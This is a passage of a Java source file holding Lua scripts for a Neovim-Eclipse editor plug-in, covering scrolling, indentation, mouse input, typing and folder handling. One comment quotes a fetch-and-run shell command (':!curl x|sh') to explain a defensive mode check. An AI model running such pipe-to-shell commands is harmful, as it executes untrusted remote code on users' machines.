                return nil -- no Ctrl-X mode at all: Ctrl-V, Ctrl-Q and Ctrl-O are their usual selves
              end
              local ok, info = pcall(vim.fn.complete_info, { 'mode' })
              if ok and type(info) == 'table' and info.mode ~= 'ctrl_x' and info.mode ~= 'cmdline'
                  and info.mode ~= 'omni' then
                return nil -- a completion that is over or of another kind: the key ends it, as in Vim
              end
              local in_cmdwin, cmdwin = pcall(vim.fn.getcmdwintype)
              if in_cmdwin and cmdwin == ':' then
                return nil -- the window of : commands: its lines are the user's own commands
              end
              pcall(vim.api.nvim_feedkeys, CTRL_Z, 'ni', false)
              vim.schedule(function()
                vim.notify('neovim4eclipse: ' .. message, vim.log.levels.WARN)
              end)
              return ''
            end, ns)
            return true
            """;

    /**
     * Sends the current window's visible search matches and highlights again ({@link #SEARCH}'s and
     * {@link #HIGHLIGHTS}'s {@code resend}), for the editor just attached or back in Neovim mode,
     * which has none painted (argument: the buffer number). Nothing when that buffer is not in
     * the editor's window ({@link #WINDOWS}' {@code editor_window}: the current one, or the one under a plug-in's float Neovim is in). Each module only when it is on (it is then loaded).
     */
    static final String SEARCH_RESEND = """
            local buf = tonumber((select(1, ...)))
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            if vim.api.nvim_win_get_buf(win) ~= buf then
              return
            end
            vim.api.nvim_win_call(win, function()
              for _, name in ipairs({ 'neovim4eclipse.search', 'neovim4eclipse.highlights' }) do
                local m = package.loaded[name]
                if m then
                  m.resend()
                end
              end
            end)
            """;

    /**
     * The lines the editor shows, which {@link #SEARCH} searches, and {@link #HIGHLIGHTS} looks at,
     * along with the window's own (arguments: the buffer number, the first and the last line,
     * 1-based, as strings). Nothing when that buffer is not in the editor's window ({@link #WINDOWS}' {@code editor_window}: the current one, or the one under a plug-in's float Neovim is in). Example: with the
     * editor scrolled alone in insert mode (its view is kept, D6), Neovim's window shows lines 1 to
     * 40 and the editor 200 to 240; both ranges are searched, so the editor's lines are highlighted. Each
     * module only when it is on (it is then loaded).
     */
    static final String SEARCH_VIEW = """
            local buf, top, bottom = tonumber((select(1, ...))), tonumber((select(2, ...))), tonumber((select(3, ...)))
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            if vim.api.nvim_win_get_buf(win) ~= buf then
              return
            end
            vim.api.nvim_win_call(win, function()
              for _, name in ipairs({ 'neovim4eclipse.search', 'neovim4eclipse.highlights' }) do
                local m = package.loaded[name]
                if m then
                  m.set_view(nil, top, bottom)
                end
              end
            end)
            """;

    /**
     * Sets {@code 'wrap'} (and with it {@code 'linebreak'}, see {@link #VIEWPORT}) in the current
     * window to Eclipse's word wrap (arguments: the buffer number, {@code "1"} for wrap or {@code "0"}).
     * Nothing when that buffer is not in the editor's window ({@link #WINDOWS}' {@code editor_window}: the current one, or the one under a plug-in's float Neovim is in): the window shows another editor's document
     * by now, whose own word wrap is sent when it is attached.
     */
    static final String SET_WRAP = """
            local buf, on = tonumber((select(1, ...))), (select(2, ...))
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            if vim.api.nvim_win_get_buf(win) ~= buf then
              return
            end
            vim.api.nvim_win_call(win, function()
              require('neovim4eclipse.viewport').set_wrap(on == true or on == 1 or on == '1')
            end)
            """;

    /**
     * Scrolls the current window so that its top line is the editor's (arguments: the buffer number,
     * the 1-based line as a string, and the mode: {@code "keep"}, {@code "drag"} or {@code "show"});
     * see {@link #VIEWPORT}'s {@code set_topline}. Nothing when that buffer is not the
     * current one (the window shows another editor's document by now). Example: the editor shows
     * lines 40 to 60 when it is attached; Neovim's window, which has placed the cursor on line 50, is
     * scrolled to line 40, so that {@code H} goes to line 40.
     */
    static final String SET_TOPLINE = """
            local buf, line, mode = tonumber((select(1, ...))), tonumber((select(2, ...))), (select(3, ...))
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            if vim.api.nvim_win_get_buf(win) ~= buf or not line then
              return
            end
            vim.api.nvim_win_call(win, function() require('neovim4eclipse.viewport').set_topline(line, mode) end)
            """;

    /**
     * Scrolls the current window by the mouse wheel (arguments: the buffer number and the lines,
     * positive down, as strings); see {@link #VIEWPORT}'s {@code scroll_lines} and
     * {@code util/WheelScroll}. Nothing when that buffer is not in the editor's window ({@link #WINDOWS}' {@code editor_window}: the current one, or the one under a plug-in's float Neovim is in). Example:
     * {@code ("3", "-3")} scrolls three lines up, as {@code 3 Ctrl-Y}.
     */
    static final String SCROLL_LINES = """
            local buf, n = tonumber((select(1, ...))), tonumber((select(2, ...)))
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            if vim.api.nvim_win_get_buf(win) ~= buf or not n or n == 0 then
              return
            end
            vim.api.nvim_win_call(win, function() require('neovim4eclipse.viewport').scroll_lines(n) end)
            """;

    /**
     * Sets a document's buffer's indentation options (arguments: the buffer's number, tabstop, "1"
     * to indent with tabs, indent width, "1" to follow braces, cinoptions). See
     * {@code util/Indentation} for why. By number, not the current buffer: Neovim may be in a
     * plug-in's float during an attach (lazy.nvim's installer as Neovim starts).
     * {@code 'shiftwidth'} is one indent level, used by {@code >>}, {@code o} and {@code cindent};
     * {@code 'softtabstop'} 0 makes Tab and Backspace in Neovim's insert mode work per character.
     */
    static final String SET_INDENTATION = """
            local buf, tabstop, use_tabs, width, braces, cinoptions = ...
            buf = tonumber(buf)
            if not vim.api.nvim_buf_is_valid(buf) then
              return
            end
            tabstop = tonumber(tabstop)
            if tabstop >= 1 and tabstop <= 64 then
              vim.bo[buf].tabstop = tabstop
              -- Kept for WINDOWS' give_document_back: :help on a document's file sets 'tabstop' 8.
              vim.b[buf].neovim4eclipse_tabstop = tabstop
            end
            vim.bo[buf].expandtab = use_tabs ~= '1'
            vim.bo[buf].shiftwidth = tonumber(width)
            vim.bo[buf].softtabstop = 0
            vim.bo[buf].autoindent = true
            vim.bo[buf].cindent = braces == '1'
            if braces == '1' then
              vim.bo[buf].cinoptions = cinoptions
            end
            """;

    /**
     * Replaces the current buffer's text without an undo step (argument: the lines, as one list;
     * never one argument each, see {@code NeovimApi.execLua}). Setting
     * {@code 'undolevels'} to -1 for one change is Vim's documented way to do that (see
     * {@code :help clear-undo}); it also clears any earlier history. The buffer-local value is put
     * back afterwards, which may be "use the global value" (-123456).
     *
     * <p>Under {@code :lockmarks}: a reused buffer (CREATE_DOCUMENT_BUFFER) keeps its marks from
     * before its editor closed, and replacing all lines would move them. Example: {@code 'a} on line
     * 2 of a reloaded, empty buffer; the one empty line is replaced by four, and {@code 'a} would go
     * to line 5 (docs/design/BUFFER_NUMBERS.md, X10). {@code :lockmarks} takes an Ex command, not a
     * Lua function, so the call runs as {@code :lockmarks lua ...}; that chunk cannot see this
     * script's locals, so the lines wait for it in {@code package.loaded}, out of {@code g:} (where
     * they would be converted to a Vimscript list and back: 35 ms for 200,000 lines, against 13 ms
     * this way).
     */
    static final String LOAD_WITHOUT_UNDO = """
            local saved = vim.bo.undolevels
            vim.bo.undolevels = -1
            package.loaded['neovim4eclipse.load'] = (...)
            local ok, err = pcall(vim.cmd, "lockmarks lua vim.api.nvim_buf_set_lines(0, 0, -1, false, package.loaded['neovim4eclipse.load'])")
            package.loaded['neovim4eclipse.load'] = nil
            vim.bo.undolevels = saved
            if not ok then
              error(err)
            end
            -- Like a file just read: not modified. NeovimSession then sets 'modified' to Eclipse's dirty
            -- flag (an editor with unsaved changes stays modified, so :update writes it).
            vim.bo.modified = false
            """;

    /**
     * Makes a new buffer (argument: its number) a document buffer, which only Eclipse writes. The
     * code and its comments: {@code core/lua/document_buffer.lua}.
     */
    static final String DOCUMENT_BUFFER = LuaModules.script("document_buffer.lua");

    /**
     * Runs normal-mode keys without mappings (argument: the keys), like {@code :normal! keys}. An
     * error ({@code gd} on a blank: "E348: No string under cursor") is shown as Neovim shows it when
     * typed, as an error message, instead of failing the request.
     *
     * <p>{@code pcall} turns the error into a Lua string, prefixed with where it came from
     * ({@code "Vim:E348: ..."}); the {@code gsub} keeps the part from the error number on.
     * {@code nvim_echo}'s {@code err = true} (Neovim 0.11) then shows it the way Neovim shows its own
     * errors: it sets {@code v:errmsg}, uses the {@code ErrorMsg} highlight, and marks the message
     * as an error for a UI ({@code msg_show} kind {@code "echoerr"}). A plain {@code nvim_echo}
     * with the {@code ErrorMsg} highlight would do neither of the last two (its kind is
     * {@code "echomsg"}).
     */
    static final String NORMAL_WITHOUT_MAPPINGS = """
            local keys = ...
            local ok, err = pcall(vim.cmd.normal, { keys, bang = true })
            if not ok then
              local msg = tostring(err):gsub('^.-(E%d+:)', '%1')
              vim.api.nvim_echo({ { msg } }, true, { err = true })
            end
            """;

    /**
     * One mouse event for Neovim's own mouse handling ({@code nvim_input_mouse}): arguments button
     * ({@code "left"}), action ({@code "press"}, {@code "drag"}, {@code "release"}), modifiers
     * ({@code "S"}, {@code "A"}, {@code ""}), line (1-based) and byte column (0-based, both as text) of the
     * character clicked in the document. Returns whether the event was handed to Neovim's mouse.
     *
     * <p><b>Why a script.</b> {@code nvim_input_mouse} takes a <em>screen</em> cell, not a buffer
     * position, and the plug-in draws nothing of Neovim's screen. Neovim's window shows what the
     * editor shows ({@link #VIEWPORT}), but not always: when Neovim's window is scrolled further
     * than Eclipse can scroll (near the end of the document), or while a scroll is on its way. So
     * the script asks Neovim where the
     * character is on its screen ({@code screenpos()}), which also accounts for tabs, wide
     * characters and wrapped lines. A character that is not on Neovim's screen is brought there:
     * <ul>
     *   <li>a press scrolls Neovim's window to it (the cursor goes there anyway);</li>
     *   <li>a drag in visual mode moves the cursor there, which extends the selection as the drag
     *       would (scrolling first would move the cursor and lose the drag's start);</li>
     *   <li>the first drag, before visual mode started, goes to the nearest edge of Neovim's screen,
     *       so the selection starts where the press was; the next drag event extends it.</li>
     * </ul>
     *
     * <p>Clicking past the end of a line points at the cell after its last character, as a click
     * there does in Neovim: after all of its cells ({@code screenpos()}'s {@code endcol}), so a line
     * that ends in a Tab or a wide character such as {@code 中} still gets the cursor after it in
     * insert mode, and a visual drag there takes it in. Without the mouse ({@code 'mouse'} lacks {@code n} or {@code v}, or
     * {@code a}) a press only moves the cursor, as the plug-in did before it forwarded the mouse.
     *
     * <p>Example: {@code ("left", "press", "", 250, 5)} with Neovim showing lines 1 to 38 scrolls
     * its window to line 250 and presses there; three presses within {@code 'mousetime'} select the
     * line ({@code V}), as in Neovim. Visual-mode letters are built with {@code string.char}: a Java
     * text block would read a backslash escape as octal.
     */
    static final String MOUSE = """
            local button, action, mods, lnum, col = ...
            lnum, col = tonumber(lnum), tonumber(col) -- the plug-in passes every argument as text
            local m = vim.o.mouse
            local visual = vim.fn.mode():match('^[vVsS' .. string.char(22, 19) .. ']') ~= nil
            if not (m:find('a') or m:find(visual and 'v' or 'n')) then
              if action == 'press' and button == 'left' then
                vim.api.nvim_win_set_cursor(0, { lnum, col })
              end
              return false
            end
            local function cell(l, c)
              local len = #vim.fn.getline(l)
              local past = len > 0 and c >= len
              local pos = vim.fn.screenpos(0, l, len == 0 and 1 or math.min(c, len - 1) + 1)
              if pos.row == 0 then
                return nil
              end
              if not past then
                return pos.row - 1, pos.col - 1
              end
              -- The cell after the last character: endcol is its last cell (1-based), so endcol is
              -- the next one 0-based. A Tab or a wide character takes more than one cell; for
              -- "ab<Tab>" the Tab is cells 2..7, and cell 3 would put the cursor before the Tab.
              -- Kept inside the window: a line that fills it would point at the window beside.
              local win = vim.fn.getwininfo(vim.api.nvim_get_current_win())[1]
              return pos.row - 1, math.min(pos.endcol, win.wincol - 1 + win.width - 1)
            end
            local row, scol = cell(lnum, col)
            if not row then
              if action == 'press' then
                vim.fn.winrestview({ topline = lnum, lnum = lnum, col = col })
              elseif visual then
                vim.api.nvim_win_set_cursor(0, { lnum, col })
                if action == 'drag' then
                  return true
                end
              else
                local edge = lnum > vim.fn.line('w$') and vim.fn.line('w$') or vim.fn.line('w0')
                lnum, col = edge, 0
              end
              row, scol = cell(lnum, col)
              if not row then
                return false
              end
            end
            vim.api.nvim_input_mouse(button, action, mods, 0, row, scol)
            return true
            """;

    /**
     * Types argument 1 as raw characters into Neovim's open insert, with no mapping or abbreviation
     * applied ({@code nvim_feedkeys(text, "n", true)}: {@code "<"} is a {@code <}, Neovim's special
     * byte 0x80 is escaped), and returns {@code true}; or types nothing and returns {@code false} when
     * Neovim is not in Insert or Replace mode. The re-typing of what Eclipse typed
     * ({@link KeyInput}), which the user's {@code inoremap jk <Esc>} or {@code iabbrev teh the} must
     * not change.
     *
     * <p><b>Why the mode check.</b> The text is whatever Eclipse typed: a paste from a web page, a
     * template's text. In Normal mode the same characters are commands, so a pasted
     * {@code :!curl x|sh} followed by a newline would run. Eclipse believes Neovim is still in the
     * insert it opened, and normally it is; but a timer or an autocommand of the user's config may
     * have ended it ({@code stopinsert}), and the plug-in must not turn text into commands then. The
     * check runs in the same request as the typing, when Neovim is idle, so the mode cannot change
     * in between. Nor while the keys are read: Neovim runs timers and other events only once its
     * typeahead is used up. Checked 2026-11-03 with Neovim 0.12.6 and a timer calling
     * {@code stopinsert} every millisecond: 200,000 fed characters all went into the one insert.
     * ({@code nvim_paste}, which never reads text as keys, was tried instead and dropped: in the
     * plug-in's session {@code .} no longer repeated the insert.) {@code mode} starts with {@code i} in Insert mode and its completion submodes
     * ({@code ic}, {@code ix}), with {@code R} in Replace and Virtual Replace ({@code Rv}); after
     * insert-mode {@code Ctrl-O} it is {@code niI}, Normal mode, and nothing is typed.
     */
    static final String TYPE_TEXT = """
            local first = vim.api.nvim_get_mode().mode:sub(1, 1)
            if first ~= 'i' and first ~= 'R' then
              return false
            end
            vim.api.nvim_feedkeys(select(1, ...), 'n', true)
            return true
            """;

    /** Pastes argument 1 at the cursor, in any mode, as a paste rather than typed keys. */
    static final String PASTE = "vim.api.nvim_paste(select(1, ...), false, -1)";

    /**
     * Moves Neovim out of folder argument 1 and everything under it, before Eclipse deletes or
     * closes the project there, and returns how many working folders it moved (0 when none was in
     * it). Each working folder inside it, the global one ({@code :cd}), a tab page's ({@code :tcd})
     * and a window's ({@code :lcd}), becomes the folder's parent; the others stay as they are.
     *
     * <p>Why: Neovim's process works in the current window's folder, the attached editor's project
     * (set when its window opens, {@link #OPEN_WINDOW}), and Windows does not delete a folder a process works in: deleting
     * that project failed with "The process cannot access the file because it is being used by
     * another process".
     *
     * <p>How: each scope's folder is read first and set again afterward where it changed, because
     * setting the global or a tab page's folder also drops the current window's own one
     * ({@code chdir(dir, 'global')} acts as {@code :cd}). A folder outside is left alone when it
     * did not change: it may be gone already (a project deleted earlier), and {@code :lcd} to it
     * would fail with E344. {@code nvim_win_call} sets another window's folder without entering it.
     * Paths are compared by {@link #PATHS}'s rule: on Windows {@code C:\Work\app} and
     * {@code c:/work/app} are one folder, and a folder reached through a link or junction is the
     * folder it points to. Example:
     * the window works in {@code /ws/app/src}; leaving {@code /ws/app} moves it to {@code /ws}.
     */
    static final String LEAVE_FOLDER = """
            local folder = ...
            local paths = require('neovim4eclipse.paths') -- PATHS: case, links, separators
            local inner = paths.canonical(folder)
            local function inside(dir)
              return paths.within(paths.canonical(dir), inner)
            end
            local refuge = vim.fs.dirname(vim.fs.normalize(folder))
            local function kept(dir) return inside(dir) and refuge or dir end
            local moved = 0
            local tabs, wins = {}, {}
            for _, tab in ipairs(vim.api.nvim_list_tabpages()) do
              local tabnr = vim.api.nvim_tabpage_get_number(tab)
              if vim.fn.haslocaldir(-1, tabnr) == 1 then
                tabs[#tabs + 1] = { tab, vim.fn.getcwd(-1, tabnr) }
              end
              for _, win in ipairs(vim.api.nvim_tabpage_list_wins(tab)) do
                local winnr = vim.fn.win_id2tabwin(win)[2]
                if vim.fn.haslocaldir(winnr, tabnr) == 1 then
                  wins[#wins + 1] = { win, vim.fn.getcwd(winnr, tabnr) }
                end
              end
            end
            if inside(vim.fn.getcwd(-1, -1)) then
              vim.fn.chdir(refuge, 'global')
              moved = moved + 1
            end
            -- Sets one scope's folder, unless it already is that (a folder outside, which may be gone
            -- by now: setting it again would fail with E344).
            local function set(win, command, scope_cwd, dir)
              local target = kept(dir)
              if inside(dir) then moved = moved + 1 end
              vim.api.nvim_win_call(win, function()
                if scope_cwd() ~= dir or target ~= dir then
                  -- chdir(), not :tcd/:lcd, which would expand `...` in the name as a shell command
                  pcall(vim.fn.chdir, target, command == 'tcd' and 'tabpage' or 'window')
                end
              end)
            end
            for _, t in ipairs(tabs) do
              set(vim.api.nvim_tabpage_get_win(t[1]), 'tcd', function() return vim.fn.getcwd(-1, 0) end, t[2])
            end
            for _, w in ipairs(wins) do
              set(w[1], 'lcd', function() return vim.fn.haslocaldir() == 1 and vim.fn.getcwd() or '' end, w[2])
            end
            return moved
            """;

    static final String GET_CLIPBOARD_OPTION = "return vim.o.clipboard";

    /** Evaluates the Vim expression in argument 1 ({@code bufnr('a.txt')}) and returns its value. */
    static final String EVAL = "return vim.fn.eval(select(1, ...))";

    /**
     * Which of the plug-in's {@code init.lua} settings are set, for the problem report
     * ({@code util/ProblemReport}). Argument: the names, without {@code g:}. Answers a list of
     * {@code {"vim.g.<name>", value}} pairs, the value as {@code vim.inspect} prints it, for the set
     * ones only. Example: {@code ({"neovim4eclipse_folds", "neovim4eclipse_task_tags"})} with
     * {@code vim.g.neovim4eclipse_folds = 0} answers {@code {{"vim.g.neovim4eclipse_folds", "0"}}}.
     * A list of pairs, not a table by name: an empty Lua table reaches Java as a list.
     */
    static final String INIT_SETTINGS = """
            local set = {}
            for _, name in ipairs((...)) do
              local value = vim.g[name]
              if value ~= nil then
                set[#set + 1] = { 'vim.g.' .. name, vim.inspect(value) }
              end
            end
            return set
            """;

    /**
     * Registers {@code :checkhealth neovim4eclipse} in the editing Neovim ({@link HealthCheck}):
     * run once at start of each Neovim, after the user's config, so the folder is appended once.
     * The code and its comments: {@code core/lua/health.lua}.
     */
    static final String HEALTH_CHECK = LuaModules.script("health.lua");
    /**
     * Neovim's status line of each editor's window, for the row the editor draws under its text
     * ({@code editor/StatusLineRow}; docs/ARCHITECTURE.md, "The status line in the editor"). The
     * code and its comments: {@code core/lua/statusline.lua}.
     */
    static final String STATUS_LINE = LuaModules.script("statusline.lua");
}
